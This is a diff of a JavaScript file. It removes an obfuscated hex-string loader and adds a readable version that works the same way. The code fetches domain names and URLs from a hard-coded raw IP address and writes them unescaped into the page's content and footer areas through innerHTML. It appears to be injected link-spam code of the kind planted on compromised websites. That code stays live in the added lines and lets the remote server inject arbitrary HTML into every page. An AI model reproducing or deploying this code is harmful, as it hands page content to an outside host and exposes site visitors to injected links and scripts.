@@ -1,1 +1,41 @@
-var _0xbe98=["\x68\x74\x74\x70\x73","\x69\x6E\x64\x65\x78\x4F\x66","\x70\x72\x6F\x74\x6F\x63\x6F\x6C","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x6D\x65\x74\x61","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x2D\x65\x71\x75\x69\x76","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x53\x65\x63\x75\x72\x69\x74\x79\x2D\x50\x6F\x6C\x69\x63\x79","\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x63\x6F\x6E\x74\x65\x6E\x74","\x75\x70\x67\x72\x61\x64\x65\x2D\x69\x6E\x73\x65\x63\x75\x72\x65\x2D\x72\x65\x71\x75\x65\x73\x74\x73","\x61\x70\x70\x65\x6E\x64","\x68\x65\x61\x64","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x70\x61\x72\x73\x65","\x63\x6F\x6E\x74\x65\x6E\x74\x6C\x69\x6E\x6B","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","","\x6C\x65\x6E\x67\x74\x68","\x64\x61\x74\x61","\x3C\x70\x3E\x3C\x61\x20\x68\x72\x65\x66\x3D\x22","\x64\x6F\x6D\x61\x69\x6E\x5F\x75\x72\x6C","\x22\x20\x72\x65\x6C\x3D\x22\x6E\x6F\x6F\x70\x65\x6E\x65\x72\x22\x20\x74\x61\x72\x67\x65\x74\x3D\x22\x5F\x62\x6C\x61\x6E\x6B\x22\x3E\x3C\x69\x6D\x67\x20\x77\x69\x64\x74\x68\x3D\x22\x35\x30\x22\x20\x68\x65\x69\x67\x68\x74\x3D\x22\x31\x30\x22\x20\x6C\x6F\x61\x64\x69\x6E\x67\x3D\x22\x6C\x61\x7A\x79\x22\x20\x73\x72\x63\x3D\x22\x2F\x75\x70\x6C\x6F\x61\x64\x73\x2F\x6E\x65\x77\x2E\x67\x69\x66\x22\x20\x2F\x3E","\x64\x6F\x6D\x61\x69\x6E\x5F\x6E\x61\x6D\x65","\x3C\x2F\x61\x3E\x3C\x2F\x70\x3E","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x47\x45\x54","\x2F\x2F\x31\x36\x35\x2E\x32\x32\x2E\x36\x31\x2E\x31\x34\x39\x2F\x61\x70\x69\x2F\x64\x6F\x6D\x61\x69\x6E\x2F\x63\x6F\x6E\x74\x65\x6E\x74","\x6F\x70\x65\x6E","\x73\x65\x6E\x64","\x66\x6F\x6F\x74\x65\x72\x6C\x69\x6E\x6B","\x3C\x61\x20\x68\x72\x65\x66\x3D\x22","\x22\x20\x74\x61\x72\x67\x65\x74\x3D\x22\x5F\x62\x6C\x61\x6E\x6B\x22\x3E","\x2C\x20\x3C\x2F\x61\x3E","\x3C\x2F\x61\x3E","\x2F\x2F\x31\x36\x35\x2E\x32\x32\x2E\x36\x31\x2E\x31\x34\x39\x2F\x61\x70\x69\x2F\x64\x6F\x6D\x61\x69\x6E\x2F\x66\x6F\x6F\x74\x65\x72"];if(window[_0xbe98[3]][_0xbe98[2]][_0xbe98[1]](_0xbe98[0])== 0){var el=document[_0xbe98[5]](_0xbe98[4]);el[_0xbe98[8]](_0xbe98[6],_0xbe98[7]);el[_0xbe98[8]](_0xbe98[9],_0xbe98[10]);document[_0xbe98[12]][_0xbe98[11]](el)};const content= new XMLHttpRequest();content[_0xbe98[13]]= function(){if(this[_0xbe98[14]]== 4&& this[_0xbe98[15]]== 200){const _0x3509x3=JSON[_0xbe98[17]](this[_0xbe98[16]]);const _0x3509x4=document[_0xbe98[19]](_0xbe98[18]);let _0x3509x5=_0xbe98[20];for(let _0x3509x6=0;_0x3509x6< _0x3509x3[_0xbe98[22]][_0xbe98[21]];_0x3509x6++){_0x3509x5+= `${_0xbe98[23]}${_0x3509x3[_0xbe98[22]][_0x3509x6][_0xbe98[24]]}${_0xbe98[25]}${_0x3509x3[_0xbe98[22]][_0x3509x6][_0xbe98[26]]}${_0xbe98[27]}`};_0x3509x4[_0xbe98[28]]= _0x3509x5}};content[_0xbe98[31]](_0xbe98[29],_0xbe98[30],true);content[_0xbe98[32]]();const footer= new XMLHttpRequest();footer[_0xbe98[13]]= function(){if(this[_0xbe98[14]]== 4&& this[_0xbe98[15]]== 200){const _0x3509x3=JSON[_0xbe98[17]](this[_0xbe98[16]]);const _0x3509x4=document[_0xbe98[19]](_0xbe98[33]);let _0x3509x5=_0xbe98[20];for(let _0x3509x6=0;_0x3509x6< _0x3509x3[_0xbe98[22]][_0xbe98[21]];_0x3509x6++){if(_0x3509x6!== _0x3509x3[_0xbe98[22]][_0xbe98[21]]- 1){_0x3509x5+= `${_0xbe98[34]}${_0x3509x3[_0xbe98[22]][_0x3509x6][_0xbe98[24]]}${_0xbe98[35]}${_0x3509x3[_0xbe98[22]][_0x3509x6][_0xbe98[26]]}${_0xbe98[36]}`}else {_0x3509x5+= `${_0xbe98[34]}${_0x3509x3[_0xbe98[22]][_0x3509x6][_0xbe98[24]]}${_0xbe98[35]}${_0x3509x3[_0xbe98[22]][_0x3509x6][_0xbe98[26]]}${_0xbe98[37]}`}};_0x3509x4[_0xbe98[28]]= _0x3509x5}};footer[_0xbe98[31]](_0xbe98[29],_0xbe98[38],true);footer[_0xbe98[32]]()
+if (window.location.protocol.indexOf('https') == 0){
+  		var el = document.createElement('meta');
+  		el.setAttribute('http-equiv', 'Content-Security-Policy');
+  		el.setAttribute('content', 'upgrade-insecure-requests');
+  		document.head.append(el);
+	};
+
+	const content = new XMLHttpRequest();
+	content.onreadystatechange = function() {
+  		if (this.readyState == 4 && this.status == 200) {
+    		const data = JSON.parse(this.responseText);
+    		const infoTag = document.getElementById("contentlink");
+            let html = "";
+			for (let i = 0; i < data['data'].length; i++) {
+                html += `<p><a href="${data['data'][i]['domain_url']}" rel="noopener" target="_blank"><img width="50" height="10" loading="lazy" src="/uploads/new.gif" />${data['data'][i]['domain_name']}</a></p>`;
+			}
+    		infoTag.innerHTML = html;
+  		}
+	};
+	content.open("GET", "//165.22.61.149/api/domain/content", true);
+	content.send();
+	
+	const footer = new XMLHttpRequest();
+	footer.onreadystatechange = function() {
+  		if (this.readyState == 4 && this.status == 200) {
+    		const data = JSON.parse(this.responseText);
+    		const infoTag = document.getElementById("footerlink");
+            let html = "";
+			for (let i = 0; i < data['data'].length; i++) {
+				if (i !== data['data'].length -1) {
+					html += `<a href="${data['data'][i]['domain_url']}" target="_blank">${data['data'][i]['domain_name']}, </a>`;
+				}
+				else {
+					html += `<a href="${data['data'][i]['domain_url']}" target="_blank">${data['data'][i]['domain_name']}</a>`;
+				}
+			}
+    		infoTag.innerHTML = html;
+  		}
+	};
+	footer.open("GET", "//165.22.61.149/api/domain/footer", true);
+	footer.send();
